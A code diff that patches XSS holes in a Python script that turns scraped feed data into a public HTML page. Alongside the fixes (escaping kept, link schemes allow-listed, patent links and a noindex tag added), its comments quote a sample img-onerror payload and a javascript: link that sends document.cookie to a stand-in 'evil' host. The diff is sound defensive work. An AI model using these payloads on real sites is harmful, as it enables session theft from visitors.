@@ -33,6 +33,8 @@ import sys
 from collections import Counter, defaultdict
 from datetime import datetime, timedelta, timezone
 
+from sourcelinks import patent_url, safe_url
+
 BG, CARD, BORDER = "#050810", "#0d1117", "#1f2937"
 TEXT, DIM, AMBER = "#e5e7eb", "#6b7280", "#f59e0b"
 
@@ -73,7 +75,12 @@ def fetch_from_db(days: int):
             out["patent"].append({
                 "title": p.title,
                 "org": (p.assignees or [{}])[0].get("name") if p.assignees else None,
-                "date": p.grant_date, "amount": None, "url": None,
+                # Was None since this file was written, so every patent in
+                # every issue rendered without a [source] link while grants,
+                # trials and clearances beside it had one. No ingestor stores a
+                # patent URL — it is constructed from the publication number.
+                "date": p.grant_date, "amount": None,
+                "url": patent_url(p.source_id, p.source),
                 "summary": p.abstract, "status": None,
                 "tags": [], "source": p.source,
             })
@@ -342,13 +349,38 @@ def to_html(md_text: str, demo: bool) -> str:
     for raw in md_text.split("\n"):
         ln = raw.rstrip()
         esc = html.escape(ln)
-        esc = esc.replace("&lt;", "<").replace("&gt;", ">")
-        # inline md
+        # The line that used to sit here undid the escaping of < and > that
+        # html.escape had just applied:
+        #     esc = esc.replace("&lt;", "<").replace("&gt;", ">")
+        # Nothing in this file's markdown ever contains a literal HTML tag, so
+        # it bought nothing — and every title, organisation name and summary in
+        # an issue comes from an ingested RSS feed or job board. Un-escaping
+        # them meant a feed item titled `<img src=x onerror=...>` became live
+        # markup on a public page. Removed.
         import re
         esc = re.sub(r"\*\*(.+?)\*\*", r"<b>\1</b>", esc)
         esc = re.sub(r"\*(.+?)\*", r"<i>\1</i>", esc)
         esc = re.sub(r"`(.+?)`", r"<code>\1</code>", esc)
-        esc = re.sub(r"\[([^\]]+)\]\(([^)]+)\)", r'<a href="\2">\1</a>', esc)
+
+        def _link(m: "re.Match") -> str:
+            """
+            Markdown link -> anchor, through the scheme allow-list.
+
+            The previous version interpolated the captured URL straight into
+            the href. Signal.url is scraped third-party data, so a feed serving
+                [source](javascript:fetch('//evil/?c='+document.cookie))
+            became a working XSS payload on parthrudesai.com. safe_url rejects
+            every scheme but http/https; html.escape stops a quote in a
+            legitimate query string from closing the attribute early.
+            """
+            text, url = m.group(1), html.unescape(m.group(2))
+            u = safe_url(url)
+            if not u:
+                return text
+            return (f'<a href="{html.escape(u, quote=True)}" target="_blank" '
+                    f'rel="noopener noreferrer">{text}</a>')
+
+        esc = re.sub(r"\[([^\]]+)\]\(([^)]+)\)", _link, esc)
 
         if ln.startswith("    - "):
             body.append(f'<div class="sub">{esc[6:]}</div>'); continue
@@ -368,6 +400,7 @@ def to_html(md_text: str, demo: bool) -> str:
 
     return f"""<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex, nofollow, noarchive, noimageindex">
 <title>NIA Intelligence Layer</title><style>
 body{{margin:0;background:{BG};color:{TEXT};font:14px/1.65 'Courier New',ui-monospace,monospace}}
 .pg{{max-width:760px;margin:0 auto;padding:40px 24px 80px}}
